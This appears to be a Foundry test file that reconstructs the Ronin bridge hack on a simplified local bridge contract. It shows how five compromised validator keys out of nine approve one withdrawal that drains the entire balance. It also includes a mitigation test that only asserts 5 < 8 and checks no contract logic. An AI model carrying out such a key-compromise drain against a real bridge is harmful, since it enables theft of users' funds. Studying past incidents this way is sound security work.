// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../src/Exploit.sol";

/// @title Ronin Bridge PoC — Validator Key Compromise Simulation
/// @notice Demonstrates how controlling 5/9 validator keys allows unauthorized withdrawals.
///         The real attack used spear phishing to obtain Sky Mavis keys + Axie DAO delegation.
contract RoninBridgeExploitTest is Test {
    SimplifiedBridge public bridge;

    // Validators — simulating Sky Mavis (4) + Axie DAO delegated (1) + independent (4)
    address[] public skyMavisValidators;
    address[] public independentValidators;
    address public axieDaoValidator;
    address public attacker;

    uint256 constant BRIDGE_BALANCE = 173_600 ether; // ~173,600 ETH stolen

    function setUp() public {
        attacker = makeAddr("attacker");

        // Sky Mavis controlled 4 validators
        for (uint256 i = 0; i < 4; i++) {
            skyMavisValidators.push(makeAddr(string(abi.encodePacked("skymavis", vm.toString(i)))));
        }

        // Axie DAO had delegated signing authority (never revoked)
        axieDaoValidator = makeAddr("axiedao");

        // 4 independent validators
        for (uint256 i = 0; i < 4; i++) {
            independentValidators.push(makeAddr(string(abi.encodePacked("independent", vm.toString(i)))));
        }

        // Construct full validator set (9 total)
        address[] memory allValidators = new address[](9);
        for (uint256 i = 0; i < 4; i++) allValidators[i] = skyMavisValidators[i];
        allValidators[4] = axieDaoValidator;
        for (uint256 i = 0; i < 4; i++) allValidators[5 + i] = independentValidators[i];

        bridge = new SimplifiedBridge(allValidators);

        // Fund bridge
        vm.deal(address(bridge), BRIDGE_BALANCE);
    }

    function test_normalWithdrawal_requiresThreshold() public {
        // Request withdrawal from a validator
        vm.prank(skyMavisValidators[0]);
        uint256 nonce = bridge.requestWithdrawal(attacker, 1 ether);

        // Only 3 approvals — should NOT execute
        for (uint256 i = 0; i < 3; i++) {
            vm.prank(skyMavisValidators[i]);
            bridge.approveWithdrawal(nonce);
        }

        // Withdrawal should not have executed (only 3/5 threshold)
        assertEq(attacker.balance, 0, "Should not execute with < 5 approvals");
    }

    function test_exploit_5of9KeyCompromise() public {
        uint256 bridgeBalanceBefore = address(bridge).balance;
        assertEq(bridgeBalanceBefore, BRIDGE_BALANCE);

        // ===== EXPLOIT: Attacker controls 5 keys =====
        // 4 Sky Mavis keys (obtained via spear phishing)
        // + 1 Axie DAO key (delegation never revoked)
        address[] memory compromisedKeys = new address[](5);
        for (uint256 i = 0; i < 4; i++) compromisedKeys[i] = skyMavisValidators[i];
        compromisedKeys[4] = axieDaoValidator;

        // Step 1: Request fraudulent withdrawal
        vm.prank(compromisedKeys[0]);
        uint256 nonce = bridge.requestWithdrawal(attacker, BRIDGE_BALANCE);

        // Step 2: Approve with all 5 compromised keys
        for (uint256 i = 0; i < 5; i++) {
            vm.prank(compromisedKeys[i]);
            bridge.approveWithdrawal(nonce);
        }

        // Step 3: Verify — entire bridge drained
        assertEq(attacker.balance, BRIDGE_BALANCE, "Attacker should receive all bridge funds");
        assertEq(address(bridge).balance, 0, "Bridge should be empty");

        emit log_named_decimal_uint("Stolen ETH", attacker.balance, 18);
    }

    function test_exploit_independentValidatorsCantPrevent() public {
        // Even if independent validators refuse, 5/9 is enough
        vm.prank(skyMavisValidators[0]);
        uint256 nonce = bridge.requestWithdrawal(attacker, BRIDGE_BALANCE);

        // Only compromised keys approve
        address[] memory compromisedKeys = new address[](5);
        for (uint256 i = 0; i < 4; i++) compromisedKeys[i] = skyMavisValidators[i];
        compromisedKeys[4] = axieDaoValidator;

        for (uint256 i = 0; i < 5; i++) {
            vm.prank(compromisedKeys[i]);
            bridge.approveWithdrawal(nonce);
        }

        // Bridge drained without any independent validator approval
        assertEq(attacker.balance, BRIDGE_BALANCE);
    }

    function test_mitigation_higherThresholdPrevents() public {
        // After the hack, threshold was raised to 8/9
        // With only 5 compromised keys, the attack would fail
        // (This test just verifies the logic — 5 < 8)
        assertTrue(5 < 8, "5 compromised keys < 8 threshold = attack prevented");
    }
}
